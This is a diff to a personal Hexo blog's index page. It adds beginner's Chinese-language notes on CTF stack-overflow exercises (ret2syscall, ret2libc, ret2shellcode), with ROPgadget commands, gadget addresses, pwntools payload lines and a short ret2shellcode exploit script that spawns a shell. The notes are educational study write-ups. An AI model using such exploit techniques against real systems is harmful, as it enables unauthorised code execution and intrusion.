@@ -152,6 +152,282 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ret2syscall-无system函数有binsh" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/04/ret2syscall-%E6%97%A0system%E5%87%BD%E6%95%B0%E6%9C%89binsh/">ret2syscall  无system函数有binsh</a>
+    </h1>
+  
+
+        
+        <a href="/2021/10/04/ret2syscall-%E6%97%A0system%E5%87%BD%E6%95%B0%E6%9C%89binsh/" class="archive-article-date">
+  	<time datetime="2021-10-04T08:50:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ret2syscall原理详解与实例分析_菜鸡CaiH的博客-CSDN博客</p>
+<p>无system函数 且 开启的 NX保护，利用ROP来查看看寄存器的gadget来一一控制对应的寄存器<br>无system函数<br>有 / bin/sh<br>开启 NX保护 </p>
+<p>解题思路：<br>1.开启了 NX保护 需要设置断点找到输入的变量的偏移量。<br>2.无system，利用ROP来找到寄存器中的每一段 gadget ，<br>3.execve(“/bin/sh”,NULL,NULL)<br>4.利用ROPgadget 来找到每一段 gadget<br>例子 ：ROPgadget –binary ./ret2syscall  –only ‘pop|ret’ | grep ‘eax’ </p>
+<p>我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考<br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a><br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell<br>execve(“/bin/sh”,NULL,NULL)</p>
+<p>其中，该程序是 32 位，所以我们需要使得<br>系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0<br>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
+<p>利用ROPgadget来查看每个寄存器的gadget<br>1.ROPgadget –binary ./ret2syscall  –only ‘pop|ret’ | grep ‘eax’<br>      选择0x080bb196 : pop eax ; ret<br>2.ROPgadget –binary ./ret2syscall  –only ‘pop|ret’ | grep ‘ebx’<br>选择0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret<br>3.ROPgadget –binary ./ret2syscall –string “/bin/sh”<br>      选择0x080be408 : /bin/sh<br>可以找到对应的地址，此外，还有 int 0x80 的地址，如下<br>4.ret2syscall ROPgadget –binary rop  –only ‘int’<br>选择 0x08049421 : int 0x80</p>
+<p><img src="/2021/10/04/ret2syscall-%E6%97%A0system%E5%87%BD%E6%95%B0%E6%9C%89binsh/1.png" alt="BP"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/04/ret2syscall-%E6%97%A0system%E5%87%BD%E6%95%B0%E6%9C%89binsh/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ret2libc2-有system函数无binsh" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/04/ret2libc2-%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/">ret2libc2  有system函数无binsh</a>
+    </h1>
+  
+
+        
+        <a href="/2021/10/04/ret2libc2-%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/" class="archive-article-date">
+  	<time datetime="2021-10-04T08:49:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ret2libc2<br>有system函数<br>无/bin/sh<br>开启NX保护</p>
+<p>我们发现，没有/bin/sh字符，所以题目就是让我们写一个”/bin/sh”进去，但是不能直接把它写入栈里面，要将它写入bss（ 在gdb中看一下是否能被调用）再作为参数被调用</p>
+<p>解题思路：<br>1.无 /bin/sh 则需要向.bss 段中的数据输入信息，再给system调用<br>2.要么利用栈特点来运行，要么运用ROP来pop掉gets函数的返回地址？</p>
+<p><img src="/2021/10/04/ret2libc2-%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/1.png" alt="BP"></p>
+<p>之后就是这样的了<br><img src="/2021/10/04/ret2libc2-%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/2.png" alt="BP"><br>1.利用栈特点的就是 payload=flat([‘A’*112,gets_add,sys_add,buf2_add,buf2_add])<br>2.利用ROP：payload=flat([‘A’*112,gets_add,pop_add,buf2_add,sys_add,’aaaa’,buf2_add])</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/04/ret2libc2-%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ret2libc3-查找system地址查找binsh" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/04/ret2libc3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/">ret2libc3  查找system地址查找binsh</a>
+    </h1>
+  
+
+        
+        <a href="/2021/10/04/ret2libc3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/" class="archive-article-date">
+  	<time datetime="2021-10-04T08:47:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>利用plt和got的关系<br>GOT表和PLT表知识详解_qq_18661257的专栏-CSDN博客_got表<br><img src="/2021/10/04/ret2libc3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/1.png" alt="BP"></p>
+<p>解题思路：<br>1.无system和bin (IDA没有实际是有的)，利用plt和got表来查找它们的地址<br>2.泄露libc地址，找到一个函数的真实地址并且知道libc的版本号就可以知道偏移量从而知道每个函数的真实地址。<br>3.真实地址需要接收：u32(q.recv()[0:4])，打包成32位的地址<br>4.基地址+函数偏移量=函数真实地址</p>
+<p>适合新手的ret2libc3之路_Vicl1fe的博客-CSDN博客<br><img src="/2021/10/04/ret2libc3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/2.png" alt="BP"><br>puts函数的返回地址返回到main函数继续再执行一次<br><img src="/2021/10/04/ret2libc3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/3.png" alt="BP"><br>图片仅供参考</p>
+<p>【 hex(puts_got_addr) 】将puts_got_addr转换成地址<br>plt表直接在IDA中查看就好啦！<br>最主要的是知道 got 表，这个必须得在 虚拟机中运行</p>
+<p>知道真实地址打开  libc database search (blukat.me)  查找libc版本号 ，知道偏移量就可以做了！（可以交叉定位版本号）</p>
+<p>main = ret2libc3.symbols[‘main’]<br>main = ret2libc3.symbols[‘_start’]</p>
+<p>这两个是不一样，到最后来判断填充字节是112还是112-8</p>
+<p>因为最开始是从start开始的，如果是 main = ret2libc3.symbols[‘main’] 的话需要填充 112-8 的字节，才刚刚好，</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/04/ret2libc3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ret2shellcode-没有system函数无binsh" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/">ret2shellcode 没有system函数无binsh</a>
+    </h1>
+  
+
+        
+        <a href="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/" class="archive-article-date">
+  	<time datetime="2021-10-04T08:45:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>收获：<br>1.将s赋值给buf2处需要 加上buf2的地址，直接在buf2处执行shellcode<br>2.查看.bss段是否可以运行可以用vmmap来查看</p>
+<p>etr2shellcode<br><img src="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/1.png" alt="BP"></p>
+<p>无binsh  </p>
+<p>题目<br><img src="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/2.png" alt="BP"><br>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
+<p>构建shellcode 在.bss处运行<br><img src="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/3.png" alt="BP"></p>
+<p> 在主函数下断点，执行后，用vmmap命令查看一下该段空间是否存在可执行的权限，发现.bss段具有可执行的权限<br><img src="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/4.png" alt="BP"><br>于是可以将shellcode写入到这块可执行的内存空间.bss段当中，然后通过不断填充字符，溢出到ebp，然后向栈里填充这段内存空间的地址，即可使得程序执行构造好的shellcod<br>通过不断填充字符观察eip的指向来计算偏移<br><img src="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/5.png" alt="BP"><br>计算到指向地址的偏移量？<br>from pwn import *<br>p = process(‘./ret2shellcode’)<br>shellcode = asm(shellcraft.sh())    //准备shellcode给.bss段执行<br>buf2_addr = 0x804a080<br>p.sendline(shellcode.ljust(112,’a’) + p32(buf2_addr))<br>p.interactive()<br>#####</p>
+<p>shellcraft.sh()是自带的一段codeshell，可以自己写，也可以去这里找，然后通过ljust方法左对齐填充字节，直到溢出到返回地址，buf2_addr即是可执行shellcode的地址</p>
+<p>（shellcode.ljust(112,’a’)这段代码就是要讲shellcode不足112长度的地方用a来填充。？？？左对齐？？）    </p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/04/ret2shellcode-%E6%B2%A1%E6%9C%89system%E5%87%BD%E6%95%B0%E6%97%A0binsh/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-String-格式化字符串-scanf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -581,145 +857,10 @@
 
 
   
-    <article id="post-”PICTURE“" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/22/%E2%80%9DPICTURE%E2%80%9C/">”PICTURE“</a>
-    </h1>
-  
-
-        
-        <a href="/2021/09/22/%E2%80%9DPICTURE%E2%80%9C/" class="archive-article-date">
-  	<time datetime="2021-09-22T13:35:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>图片上传成功啦！！</p>
-<p>123123123<br><img src="/2021/09/22/%E2%80%9DPICTURE%E2%80%9C/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210526132821.jpg" alt="BP"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/22/%E2%80%9DPICTURE%E2%80%9C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/22/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2021/09/22/hello-world/" class="archive-article-date">
-  	<time datetime="2021-09-22T12:14:16.537Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/22/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 
 
